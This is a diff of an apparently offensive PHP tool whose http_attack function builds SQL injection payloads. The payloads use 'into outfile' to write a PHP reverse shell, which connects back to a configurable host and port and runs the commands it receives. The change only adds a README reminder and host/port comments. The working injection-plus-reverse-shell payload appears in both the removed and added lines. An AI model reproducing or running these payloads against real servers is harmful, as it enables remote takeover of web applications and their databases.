@@ -122,7 +122,10 @@ function http_attack($host,$index="/",$method,$cookies="",$addition=array()){
       foreach($wordlist as $p){
         $p=str_replace("\n","",$p);
         $p="\"$p\"";
-      $cmd=array("a"=>"1';select \" <?php $"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'127.0.0.1',9999);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\" into outfile '$p'; \"","b"=>"1\";select \"<?php "."$"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'127.0.0.1',9999);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\""." into outfile $p#");
+        
+        //                                 CHECK THE README FILE !!
+        
+      $cmd=array("a"=>"1';select \" <?php $"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell"./*host*/",'127.0.0.1',"/*port*/"9999);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\" into outfile '$p'; \"","b"=>"1\";select \"<?php "."$"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,"/*host*/."'127.0.0.1',"/*port*/."9999);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\""." into outfile $p#");
 
       foreach($cmd as $command){
       $blank_="";
